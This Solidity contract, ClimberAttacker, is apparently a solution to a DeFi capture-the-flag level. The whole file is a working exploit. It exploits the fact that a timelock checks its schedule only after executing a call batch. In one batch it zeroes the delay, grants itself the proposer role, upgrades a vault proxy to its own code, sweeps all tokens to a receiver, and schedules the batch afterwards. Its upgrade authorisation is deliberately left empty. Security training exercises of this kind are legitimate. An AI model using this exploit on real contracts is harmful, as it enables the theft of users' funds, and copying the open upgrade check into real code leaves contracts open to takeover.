// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address owner) external returns (uint256);
}

interface ITimeLock {
    function updateDelay(uint64 newDelay) external;
    function grantRole(bytes32 role, address account) external;
    
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
    
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

interface IVaultProxy {
    function upgradeTo(address newImplementation) external;
}

contract ClimberAttacker is UUPSUpgradeable{
    
    ITimeLock private immutable timelock;
    
    IVaultProxy private immutable vaultProxy;

    address[] private targets;
    
    uint256[] private values;

    bytes[] data;

    bytes32 salt;

    constructor(address timelockAddr, address vaultProxyAddr) {
        timelock = ITimeLock(timelockAddr);
        vaultProxy = IVaultProxy(vaultProxyAddr);
    }
 
    function attack(address tokenAddr, address receiver) external {
        targets.push(address(timelock));
        values.push(0);
        data.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        targets.push(address(timelock));
        values.push(0);
        data.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));

        targets.push(address(vaultProxy));
        values.push(0);
        data.push(abi.encodeWithSignature("upgradeTo(address)", address(this)));

        targets.push(address(vaultProxy));
        values.push(0);
        data.push(abi.encodeWithSignature("sweep(address,address)", tokenAddr, receiver));
        
        targets.push(address(this));
        values.push(0);
        data.push(abi.encodeWithSignature("schedule()"));

        timelock.execute(targets, values, data, salt);
    }

    function schedule() external {
        timelock.schedule(targets, values, data, salt);
    }

    function sweep(address tokenAddr, address receiver) external {
        IERC20 token = IERC20(tokenAddr);
        require(token.transfer(receiver, token.balanceOf(address(this))), "Transfer failed");
    }

    function _authorizeUpgrade(address newImplementation) internal override {}

}